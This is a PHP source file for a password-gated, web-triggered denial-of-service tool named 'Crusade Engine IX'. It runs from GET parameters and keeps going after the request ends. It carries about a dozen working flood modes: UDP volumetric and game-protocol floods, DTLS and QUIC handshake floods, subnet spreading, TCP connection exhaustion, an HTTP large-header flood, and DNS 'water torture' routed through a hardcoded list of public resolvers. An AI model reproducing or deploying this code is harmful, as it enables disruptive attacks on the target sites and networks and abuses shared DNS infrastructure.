<?php

$host = null;
$mode = null;
$port = null;
$time = null;
$wait = null;
$conn = null;
$data = null;
$sockets = [];

goto main;

udp:
    if ($mode === 1) {
        if (isset($_GET['frag'])) {
            // Hyper Volumetric
            $data = random_bytes(65000);
        } else {
            // Volumetric
            $data = random_bytes(1440);
        }
    } elseif ($mode === 2) {
        // Value Source Engine
        $data = "\xFF\xFF\xFF\xFFTSource Engine Query\x00";
    } elseif ($mode === 3) {
        // RakNet Engine
        $data =
            "\x02".                             // ID: Unconnected Ping Open Connections
            random_bytes(8).                    // Timestamp
            "\x00\xFF\xFF\x00\xFE\xFE\xFE\xFE". // Raknet Offline Magic String
            "\xFD\xFD\xFD\xFD\x12\x34\x56\x78". // Raknet Offline Magic String - cont
            random_bytes(8);                    // GUID (8-byte random token)
    } elseif ($mode === 4) {
        // id Tech3 Engine
        $data = "\xFF\xFF\xFF\xFFgetinfo " . random_bytes(3);
    } else {
        // Packet-Per-Second
        $data = random_bytes(18);
    }
    
    $s = stream_socket_client(
        "udp://{$host}:{$port}",
        $errno,
        $errstr,
        0,
        STREAM_CLIENT_CONNECT
    );
    if (!$s) die();
    
    stream_set_blocking($s, false);
    
    $go = microtime(true) + $time;
    
    while (microtime(true) < $go) {
        stream_socket_sendto($s, $data);
    }
    @fclose($s);
    goto eof;

udpfw:
    for ($i = 0; $i < $conn; $i++) {
        $s = stream_socket_server("udp://0.0.0.0:0", $errno, $errstr, STREAM_SERVER_BIND);
        if ($s) $sockets[] = $s;
    }
    if (empty($sockets)) die();

    $go = microtime(true) + $time;

    while (microtime(true) < $go) {
        foreach ($sockets as $s) {
            // High Entropy Flood
            $data = random_bytes(mt_rand(512, 1440));
            $port = ":" . mt_rand(1024, 65535);

            stream_socket_sendto($s, $data, 0, $host . $port);
            
            if (microtime(true) >= $go) break;
        }
    }
    foreach ($sockets as $s) @fclose($s);
    goto eof;

udpadv:
    $gen  = null;
    $head = null;
    $tail = null;

    if ($mode === 11) {
        // Datagram Transport-Layer-Security
        $gen  = 32;
        $head = 
            "\x16".                                      // Record Type: Handshake (22)
            "\xfe\xfd".                                  // DTLS Version: 1.2
            "\x00\x00".                                  // Epoch: 0
            "\x00\x00\x00\x00\x00\x00".                  // Sequence Number: 0
            "\x00\x5d".                                  // Record Length: 93 bytes
            "\x01".                                      // Handshake Type: ClientHello (1)
            "\x00\x00\x51".                              // Handshake Message Length: 81 bytes
            "\x00\x00".                                  // Message Sequence: 0
            "\x00\x00\x00".                              // Fragment Offset: 0
            "\x00\x00\x51".                              // Fragment Length: 81 bytes
            "\xfe\xfd";                                  // Client Version: DTLS 1.2
        $tail =
            "\x00".                                      // Session ID Length: 0
            "\x00".                                      // Cookie Length: 0 (Initial request)
            "\x00\x24".                                  // Cipher Suites Length: 36 bytes (18 ciphers x 2 bytes)
            "\x13\x01\x13\x02\x13\x03".                  // Cipher Suites (TLS 1.3 ciphers)
            "\xc0\x2b\xc0\x2f\xc0\x30\xc0\x2c\xc0\x28".  // Cipher Suites (ECDHE ciphers)
            "\xc0\x27\xc0\x14\xc0\x13\xc0\x09\xc0\x0a".  // Cipher Suites (ECDHE ciphers)
            "\x00\x9c\x00\x9d\x00\x2f\x00\x35\x00\x0a".  // Cipher Suites (AES-GCM / AES-CBC ciphers)
            "\x01\x00".                                  // Compression: Length 1, Type 0 (null)
            "\x00\x00";                                  // Extensions Length: 0
    } else {
        // Quick UDP Internet Connections
        $gen  = 4;
        $head = 
            "\xc3".                   // Header: Long Header, Initial, 4-byte PN
            "\x00\x00\x00\x01".       // QUIC Version 1
            "\x08".                   // Destination Connection ID Length
            random_bytes(8).          // Destination Connection ID
            "\x08".                   // Source Connection ID Length
            random_bytes(8).          // Source Connection ID
            "\x00".                   // Token length: 0
            "\x0b";                   // Length: 11 bytes (PN + payload)
        $tail =
            "\x06".                   // Payload: Frame Type CRYPTO (0x06)
            "\x00".                   // Payload: Offset: 0 (1-byte varint)
            "\x04".                   // Payload: Length: 4 (1-byte varint)
            random_bytes(4);          // Payload: Fake TLS data
    }

    $s = stream_socket_client(
        "udp://{$host}:{$port}", 
        $errno, 
        $errstr, 
        0,
        STREAM_CLIENT_CONNECT
    );
    if (!$s) die();

    $go = microtime(true) + $time;

    while (microtime(true) < $go) {
        $data = $head . random_bytes($gen) . $tail;
        stream_socket_sendto($s, $data);
    }
    @fclose($s);
    goto eof;

udpcidr:
    $cidr = $_GET['mask'] ?? die();

    if ($cidr >= 30) die();
    
    $ip = ip2long($host);

    $mask = ~((1 << (32 - $cidr)) - 1);
    
    $network   = $ip & $mask;
    $broadcast = $network | ~$mask;
    
    for ($i = $network + 1; $i < $broadcast; $i++) {
        $sockets[] = long2ip($i);
    }
    
    $s = stream_socket_server(
        "udp://0.0.0.0:0",
        $errno,
        $errstr,
        STREAM_SERVER_BIND
    );
    if (!$s) die();

    $go = microtime(true) + $time;

    while (microtime(true) < $go) {
        $data = random_bytes(mt_rand(512, 1440));

        $port = ":" . mt_rand(49152, 65535);

        foreach ($sockets as $addr) {
            // Spread-Spectrum Subnet Flood
            stream_socket_sendto($s, $data, 0, $addr . $port);

            if (microtime(true) >= $go) break 2;
            if ($wait) usleep($wait);
        }
    }
    @fclose($s);
    goto eof;
    
tcp:
    $streams = [];
    $states  = [];

    for ($i = 0; $i < $conn; $i++) {
        $streams[$i] = null;
        $states[$i]  = 0;
    }

    $go = microtime(true) + $time;

    while (microtime(true) < $go) {
        for ($i = 0; $i < $conn; $i++) {
            switch ($states[$i]) {
                case 0:
                    $ctx = stream_context_create();

                    $fd = stream_socket_client(
                        "tcp://{$host}:{$port}",
                        $errno,
                        $errstr,
                        0.5,
                        STREAM_CLIENT_CONNECT | STREAM_CLIENT_ASYNC_CONNECT,
                        $ctx
                    );

                    if ($fd) {
                        // Connection Exhaustion Flood
                        stream_set_blocking($fd, false);
                        $streams[$i] = $fd;
                        $states[$i] = 1;
                    }
                    break;
                case 1:
                    $read   = null;
                    $write  = [$streams[$i]];
                    $except = null;

                    $changed = stream_select($read, $write, $except, 0, 10000);

                    if ($changed > 0) {
                        $states[$i] = 2;
                    } elseif ($changed === false) {
                        @fclose($streams[$i]);
                        $states[$i] = 0;                
                    }
                    break;
                case 2:
                    $read   = null;
                    $write  = null;
                    $except = [$streams[$i]]; // out-of-band exceptions

                    $changed = stream_select($read, $write, $except, 0, 10000);

                    if ($changed > 0) {
                        @fclose($streams[$i]);
                        $states[$i] = 0;
                    }
                    break;
            }
            if (microtime(true) >= $go) break 2;
            usleep(10000);
        }
    }
    goto eof;

tcpfw:
    $data = str_repeat($data, 1024);

    $fds = array_fill(0, $conn, ['state' => 0, 'fd' => null]);

    $go = microtime(true) + $time;

    while (microtime(true) < $go) {
        for ($i = 0; $i < $conn; $i++) {
            if (microtime(true) >= $go) break;

            switch ($fds[$i]['state']) {
                case 0:
                    $fd = stream_socket_client(
                        "tcp://{$host}:{$port}",
                        $errno,
                        $errstr,
                        0,
                        STREAM_CLIENT_CONNECT | STREAM_CLIENT_ASYNC_CONNECT
                    );
                    if ($fd) {
                        stream_set_blocking($fd, false);
                        $fds[$i]['fd'] = $fd;
                        $fds[$i]['state'] = 1;
                    }
                    break;
                case 1:
                    $write = [$fds[$i]['fd']];
                    $read  = null;
                    $except = null;

                    $res = stream_select($read, $write, $except, 0, 10000);

                    if ($res > 0 && !empty($write)) {
                        $fds[$i]['state'] = 2;
                    } elseif ($res === false) {
                        fclose($fds[$i]['fd']);
                        $fds[$i]['state'] = 0;
                    }
                    break;
                case 2:
                    // Application Garbage Flood
                    $sent = @fwrite($fds[$i]['fd'], $data);

                    if ($sent === false) {
                        fclose($fds[$i]['fd']);
                        $fds[$i]['state'] = 0;
                    }
                    break;
            }
            usleep(5000);
        }
    }
    goto eof;
    
http:
    $s     = null;
    $path  = "/";
    $proto = "tcp";

    if (isset($_GET['ssl'])) {
        $proto = "tls";
    }
    if (isset($_GET['path'])) {
        $path = $_GET['path'];
        $path = '/' . ltrim($path, '/');
    }

    $vers = strval(mt_rand(0,36));

    // Layer-7 Large-Header Flood
    $data = "GET {$path} HTTP/1.1\r\n".
            "Host: {$host}\r\n".
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.{$vers} (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.{$vers}\r\n".
            "Cache-Control: no-cache\r\n".
            "Pragma: no-cache\r\n".
            "Accept-Encoding: br, gzip;q=1.0, deflate;q=0.5\r\n".
            "Accept-Language: en-US, en;q=0.9, es-419;q=0.8, es;q=0.7, fr-CA;q=0.6, fr;q=0.5, ja;q=0.4, de;q=0.3, zh-Hant-HK;q=0.2, sjo-Latn;q=0.1, qya-Latn;q=0.05, egy-Egyp;q=0.01, art-x-emoji;q=0.001\r\n".
            "Accept: application/octet-stream; q=1.000, text/html; q=0.999, application/xhtml+xml; q=0.998, application/xml; q=0.997, image/webp; q=0.996, image/apng; q=0.995, application/signed-exchange; v=b3; q=0.994, application/json; q=0.993, text/javascript; q=0.992, application/javascript; q=0.991, application/x-shockwave-flash; q=0.990, text/plain; q=0.989, text/css; q=0.988, image/png; q=0.987, image/jpeg; q=0.986, image/gif; q=0.985, application/xml+xhtml; q=0.984, application/graphql; q=0.983, application/ld+json; q=0.982, text/csv; q=0.981, font/woff2; q=0.980, audio/mpeg; q=0.979, video/mp4; q=0.978, multipart/form-data; q=0.977, application/x-www-form-urlencoded; q=0.976, application/vnd.api+json; q=0.975, application/pdf; q=0.974, application/zip; q=0.973, application/rtf; q=0.972, text/calendar; q=0.971, image/svg+xml; q=0.970, audio/ogg; q=0.001, */*; q=0.000\r\n".
            "Accept-Charset: utf-8, iso-8859-1;q=0.8, utf-16;q=0.7, windows-1252;q=0.6, shift-jis;q=0.5, koi8-r;q=0.4\r\n".
            "Referer: https://www.google.com/search?q={$host}\r\n".
            "Urgency: high\r\n".
            "Connection: Keep-Alive\r\n\r\n";

    $go = microtime(true) + $time;
    
    while (microtime(true) < $go) {
        $s = @stream_socket_client("{$proto}://{$host}:{$port}", $errno, $errstr, 5);

        if ($s === false) {
            sleep(1);
            continue;
        }

        while (microtime(true) < $go) {
            $result = @stream_socket_sendto($s, $data);

            if ($result === false || $result === 0) {
                @fclose($s);
                break;
            }

            $garbage = fread($s, 16384); // 16 KB
            if ($garbage === false || feof($s)) {
                    @fclose($s);
                    break;
            }

            if ($wait) usleep($wait);
        }
    }
    @fclose($s);
    goto eof;

dns:
    $head = 
        "\x01\x00". // Flags: Standard Query. Recursion Desired
        "\x00\x01". // QDCOUNT: 1 Question
        "\x00\x00". // ANCOUNT: 0
        "\x00\x00". // NSCOUNT: 0
        "\x00\x00"; // ARCOUNT: 0

    $tail =
        "\x00".     // Root label: Null terminator
        "\x00\x01". // QTYPE: A (IPv4 Address)
        "\x00\x01"; // QCLASS: IN (Internet)

    $char = 'abcdefghijklmnopqrstuvwxyz';

    $resolvers = [
        "8.8.8.8",        "8.8.4.4",         "1.1.1.1",        "1.0.0.1",
        "9.9.9.9",        "149.112.112.112", "208.67.222.222", "208.67.220.220",
        "185.228.168.9",  "185.228.169.9",   "94.140.14.14",   "94.140.15.15",
        "77.88.8.8",      "77.88.8.1",       "76.76.2.0",      "76.76.10.0",
        "76.76.19.19",    "76.223.122.150",  "84.200.69.80",   "84.200.70.40",
        "91.239.100.100", "89.233.43.71",    "193.17.47.1",    "185.43.135.1",
        "156.154.70.1",   "156.154.71.1",    "45.90.28.0",     "45.90.30.0",
        "37.235.1.174",   "37.235.1.177",    "164.124.101.2",  "203.248.252.2",
        "83.137.41.8",    "83.137.41.9",     "64.6.64.6",      "64.6.65.6",
        "5.11.11.5",      "5.11.11.11",      "8.26.56.26",     "8.20.247.20",
        "83.145.86.7",    "83.145.86.8",     "185.228.168.9",  "185.228.169.9",
        "223.5.5.5",      "223.6.6.6",       "139.18.25.33",   "139.18.25.34",
        "80.80.80.80",    "80.80.81.81",     "200.248.178.54", "200.33.3.123",
        "84.236.142.130", "103.18.138.20",   "139.59.218.207", "139.59.219.245",
        "194.72.35.194",  "74.82.42.42",     "200.160.0.8",    "103.168.90.81",
        "209.150.154.1",  "103.23.150.89",   "61.8.0.113"
    ];

    if (isset($_GET['more'])) {
        $url = urldecode($_GET['more']); // public-dns.info

        $contents = file_get_contents($url);

        if ($contents !== false) {
            $ips = preg_split('/\R/', $contents, -1, PREG_SPLIT_NO_EMPTY);

            foreach ($ips as $ip) {
                $resolvers[] = trim($ip);
            }
        }
    }

    foreach ($resolvers as $resolver) {
        $s = fsockopen("udp://$resolver", 53, $errno, $errstr, 10);
        if ($s) $sockets[] = $s;
    }
    if (empty($sockets)) die();

    $go = microtime(true) + $time;

    while (microtime(true) < $go) {
        $len = random_int(5, 15);

        $subdom = 
            substr(
                str_shuffle(str_repeat($char, ceil($len / strlen($char)))), 0, $len
            ) . "." . $host;
        $qname = '';
        $parts = explode('.', $subdom);

        foreach ($parts as $label) {
            $qname .= chr(strlen($label)) . $label;
        }
        $query = $head . $qname . $tail;
        $query = pack('n', mt_rand(0, 65535)) . $query; // Transaction ID

        foreach ($sockets as $s) {
            if (microtime(true) >= $go) {
                break 2;
            }
            // DNS Water Torture
            fwrite($s, $query);
        }
        if ($wait) usleep($wait);
    }
    foreach ($sockets as $s) {
        @fclose($s);
    }
    goto eof;

main:
    $key = $_GET['gate'] ?? "";
    if (
        md5($key) !==
        "5f4dcc3b5aa765d61d8327deb882cf99"
    ) die();

    $host = $_GET['host'] ?? die();

    print("Crusade Engine IX<br>Ave Christus Rex!");

    if (session_id()) {
        session_write_close();
    }
    set_time_limit(0);
    @ini_set('max_execution_time', 0);

    ignore_user_abort(true);

    if (function_exists('fastcgi_finish_request')) {
        @fastcgi_finish_request(); // PHP-FPM
    } else {
        if (function_exists('apache_setenv')) {
            // disable apache mod_deflate/gzip compression
            @apache_setenv('no-gzip', 1);
        }
        @ini_set('zlib.output_compression', 0);

        http_response_code(200);
        header("Content-Length: 0");
        header("Connection: close");

        // flush all open output-buffers
        while (ob_get_level() > 0) {
            ob_end_flush();
        }
        flush();
    }

    if (preg_match('/(::|([^:]*:){3,})/', $host) === 1) {
        if ($host[0] !== '[') {
            $host = "[$host]";
        }
    }

    if (preg_match('~^(?:https?://)?(?:www\.)?([^/:]+)~i', $host, $domain)) {
        $host = $domain[1];
    }

    $mode = intval($_GET['mode'] ?? 0);
    $port = intval($_GET['port'] ?? 0);
    $time = intval($_GET['time'] ?? 5);
    $conn = intval($_GET['conn'] ?? 50);

    if (isset($_GET['wait'])) {
        $wait = intval($_GET['wait']);

        if ($wait < 1)    $wait = 10;
        if ($wait > 5000) $wait = 5000;

        $wait = $wait * 1000;
    }

    if ($time > 3600  || $time < 5) $time = 30;
    if ($conn > 10000 || $conn < 5) $time = 50;
    if ($port > 65535 || $port < 1) $port = mt_rand(49152, 65535);

    if ($mode === 5)  goto tcp;
    if ($mode === 6)  goto tcpfw;
    if ($mode === 7)  goto udpcidr;
    if ($mode === 8)  goto udpfw;
    if ($mode === 9)  goto http;
    if ($mode === 10) goto dns;
    if ($mode === 11 || $mode === 12) goto udpadv;
    goto udp;

eof:
?>
